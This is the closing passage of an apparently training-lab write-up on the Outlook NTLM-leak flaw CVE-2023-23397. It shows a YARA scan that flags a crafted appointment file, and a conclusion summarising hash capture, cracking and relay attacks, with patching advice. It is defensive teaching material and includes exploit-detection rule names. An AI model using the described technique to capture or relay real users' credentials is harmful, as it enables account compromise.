PS C:\Users\Administrator\Desktop> yara64 .\cve-2023-23397.yar.txt .\appointment.msg
SUSP_EXPL_Msg_CVE_2023_23397_Mar23 .\appointment.msg
EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 .\appointment.msg


```

Click and continue learning!

Question Done

### Conclusions

In this room, we have experimented with how a simple vulnerability could allow an attacker to access authentication material without requiring any interaction from their victim by sending a simple, specially crafted email. NTLM Leaks are nothing new in Windows environments, but having one in such a widespread application as Outlook makes this particularly important.

While we have used the vulnerability to capture and crack the Net-NTLMv2 hash, the fact that we can trigger an authentication attempt on behalf of the victim also enables other types of relay attacks, where cracking the hash is not even needed.

As always, the preferred recommendation to avoid falling victim to such an attack is to keep your Outlook installation up to date, as patches are already available from Microsoft.

Answer the questions below

Click and continue learning!

 Completed


[[Introduction to Cryptography]]